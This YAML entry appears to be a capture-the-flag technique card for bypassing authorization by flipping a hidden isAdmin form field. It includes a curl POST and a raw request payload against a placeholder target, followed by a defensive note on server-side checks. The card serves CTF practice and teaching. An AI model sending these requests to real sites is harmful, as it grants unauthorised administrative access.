name: hidden_field_isadmin_bypass
category: web
tags: [authorization, hidden_field, client_trust, privilege_escalation]
indicators:
  - "Hidden form field for authorization (isAdmin, role, etc.)"
  - "Server trusts client-side values without validation"
  - "No actual authentication logic"
  - "Business logic flaw"

tricks:
  - name: "Step 1: Identify hidden field"
    when: "Found login form"
    how: "Inspect HTML source for hidden fields"
    payload: |
      # View page source or use browser dev tools
      # Found: <input type="hidden" name="isAdmin" value="false" />
      # Server checks: if ($_POST['isAdmin'] == "true")

  - name: "Step 2: Modify hidden field value"
    when: "Hidden field controls authorization"
    how: "Send POST request with modified value"
    payload: |
      curl -X POST "http://TARGET/index.php" \
        -d "username=test&password=test&isAdmin=true"
      # Server trusts the isAdmin value from client

  - name: "Step 3: Get flag"
    when: "Execute attack"
    how: "Submit form with isAdmin=true"
    payload: |
      POST /index.php
      username=anything&password=anything&isAdmin=true
      # Response: Welcome Admin, here is the flag: flag{...}

  - name: "Key insight"
    when: "Understanding the vulnerability"
    how: "Never trust client-side data"
    payload: |
      # Hidden fields are NOT secure
      # They can be easily modified by users
      # Authorization should be server-side only
      # Never use hidden fields for access control

